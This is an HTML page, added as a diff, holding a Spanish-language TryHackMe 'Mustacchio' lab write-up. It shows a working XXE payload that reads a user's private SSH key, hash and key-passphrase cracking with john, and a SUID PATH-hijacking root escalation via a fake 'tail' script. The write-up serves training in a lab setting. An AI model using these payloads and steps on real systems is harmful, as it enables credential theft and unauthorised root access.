@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>THM - Mustacchio | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-info text-dark fs-6">TryHackMe</span>
+        <span class="badge bg-success fs-6">Easy</span>
+        <span class="badge bg-secondary">Linux</span>
+        <span class="badge bg-secondary">XXE</span>
+        <span class="badge bg-secondary">SQLite</span>
+        <span class="badge bg-secondary">SUID</span>
+        <span class="badge bg-secondary">PATH Hijacking</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">Mustacchio</h1>
+      <p class="text-secondary mb-3">SQLite backup con hash; XXE para leer clave SSH privada de barry; escalada via PATH hijacking en binario SUID.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">wfuzz</span>
+        <span class="badge bg-dark border border-secondary p-2">sqlitebrowser</span>
+        <span class="badge bg-dark border border-secondary p-2">john</span>
+        <span class="badge bg-dark border border-secondary p-2">ssh2john</span>
+      </div>
+    </div>
+        <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Scanning</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>nmap -sC -sV -p 22,80 -Pn -n -oN targeted 10.10.0.151</code></pre>
+      </div><img src="img/thm-mustacchio/0814160418.png" class="img-fluid rounded mb-3 border border-secondary" alt="nmap scan">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-globe"></i> Puerto 80 - SQLite Backup</h4>
+      <img src="img/thm-mustacchio/0814160416.png" class="img-fluid rounded mb-3 border border-secondary" alt="wfuzz">
+      <p class="text-secondary">Encontramos <code>custom/js/users.bak</code>. Lo abrimos con sqlitebrowser:</p>
+      <img src="img/thm-mustacchio/0814170529.png" class="img-fluid rounded mb-3 border border-secondary" alt="file type">
+      <img src="img/thm-mustacchio/0814170503.png" class="img-fluid rounded mb-3 border border-secondary" alt="sqlite browser">
+      <img src="img/thm-mustacchio/0814170546.png" class="img-fluid rounded mb-3 border border-secondary" alt="john cracked hash">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-lightning-charge"></i> Puerto 8765 - XXE Injection</h4>
+      <img src="img/thm-mustacchio/0816180630.png" class="img-fluid rounded mb-3 border border-secondary" alt="admin panel">
+      <img src="img/thm-mustacchio/0816180626.png" class="img-fluid rounded mb-3 border border-secondary" alt="source code hint">
+      <p class="text-secondary">El panel acepta XML. Explotamos XXE para leer la clave SSH de barry:</p>
+      <div class="code-block mb-3"><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+   &lt;!ELEMENT foo ANY &gt;
+   &lt;!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" &gt;]&gt;
+&lt;comment&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/comment&gt;</code></pre></div><p class="text-secondary">Obtenemos la clave RSA cifrada de barry y la crackeamos:</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>python2 /usr/share/john/ssh2john.py id_rsa > id_rsa.john
+john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+      </div><img src="img/thm-mustacchio/0816180616.png" class="img-fluid rounded mb-3 border border-secondary" alt="passphrase cracked">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>ssh barry@10.10.211.98 -i id_rsa</code></pre>
+      </div><img src="img/thm-mustacchio/0816190721.png" class="img-fluid rounded mb-3 border border-secondary" alt="ssh login">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-warning border-left-warning mb-3"><i class="bi bi-arrow-up-circle"></i> Escalada - SUID PATH Hijacking</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>find / -perm -u=s -type f 2>/dev/null</code></pre>
+      </div><img src="img/thm-mustacchio/0816190711.png" class="img-fluid rounded mb-3 border border-secondary" alt="suid files">
+      <p class="text-secondary">/home/joe/livelog llama a <code>tail</code> sin ruta absoluta:</p>
+      <img src="img/thm-mustacchio/0816190701.png" class="img-fluid rounded mb-3 border border-secondary" alt="ltrace tail">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>cd /tmp
+echo "/bin/bash" > tail
+chmod +x tail
+export PATH=/tmp:$PATH
+/home/joe/live_log</code></pre>
+      </div><img src="img/thm-mustacchio/0816190759.png" class="img-fluid rounded mb-3 border border-secondary" alt="root">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-success border-left-success mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary"><li>Los archivos .bak en directorios web pueden contener bases de datos con credenciales.</li>
+<li>XXE permite leer archivos del sistema cuando la aplicacion parsea XML sin restricciones.</li>
+<li>Los binarios SUID con llamadas a comandos sin ruta absoluta son vulnerables a PATH hijacking.</li></ul>
+    </section>
+  </main>
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;&#183;&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
